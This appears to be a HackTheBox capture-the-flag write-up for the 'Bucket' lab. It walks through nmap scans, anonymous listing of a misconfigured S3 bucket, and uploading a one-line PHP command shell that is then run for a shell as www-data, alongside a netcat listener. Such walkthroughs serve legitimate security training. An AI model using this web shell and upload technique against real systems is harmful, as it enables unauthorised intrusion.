<h2>AWS lab on HackTheBox called ‘Bucket’</h2>

<h3>Initial Access:</h3>
Step 1: nmap -Pn 10.10.10.212 -p- --min-rate=5000|awk -F '/' '/open/ {print $1}'

Output returns open ports 22 and 80.

Step 2: Enumerate these open ports further with nmap: nmap -Pn 10.10.10.212 --min-rate=5000 -p 22,80 -sCV -oN nmap-htb-buckets 

Output returns:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/651a96ff-1389-4e6a-8db0-786d0045cf75)

Step 3: Nmap output shows a domain name of bucket.htb.  Enter this into /etc/hosts file so that we can access this domain name: 10.10.10.212 bucket.htb

Step 4: Visit the site http://bucket.htb.  Looking over the source code on the site shows:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/35ca4db5-919d-4916-923d-874e11e55532)

This shows a source at a subdomain of http://s3.bucket.htb.  

Enter this subdomain into /etc/hosts: 10.10.10.212 bucket.htb s3.bucket.htb

Step 5: The subdomain of s3.bucket.htb indicates that this is an aws s3 bucket.  Let’s check if we can list any s3 buckets with anonymous access using awscli: aws --no-sign-request s3 ls --endpoint-url http://s3.bucket.htb

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/f5597f92-9daf-4364-a5fe-649361cdc27d)

This return shows that there is a s3 bucket called ‘adserver’.

Step 6: List the ‘adserver’ s3 bucket: aws --no-sign-request s3 --endpoint-url http://s3.bucket.htb ls s3://adserver

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/92959525-b656-4c2b-85fe-47f5258346d7)

Download ‘index.html’ listed in the bucket: aws s3 --no-sign-request --endpoint-url http://s3.bucket.htb  cp s3://adserver/index.html .

Opening index.html confirms that this bucket is listing the website http://bucket.htb.  

Step 7: Check for more information on what we can do on this s3 bucket by running the ‘OPTIONS’ request method on the s3.bucket.htb endpoint:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/f4bc41c8-224e-411d-a556-852ef6122026)

We see from this that we can use the ‘PUT’ request method which is used to upload files.  

Step 8: Upload a php command shell (`<?php system($_GET[“cmd”]); ?>`) to the bucket: aws s3 --no-sign-request --endpoint-url http://s3.bucket.htb cp test.php s3://adserver/

Navigate to the uploaded file: http://bucket.htb/test.php?cmd=whoami

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/108b6033-cda6-431b-84af-d15f3514f864)

Step 9: Open up a netcat listener: nc -lvnp 4444

Step 10: Upload a php webshell using the same command used in step 8.  Then navigate to the uploaded web shell to get a shell as user www-data.





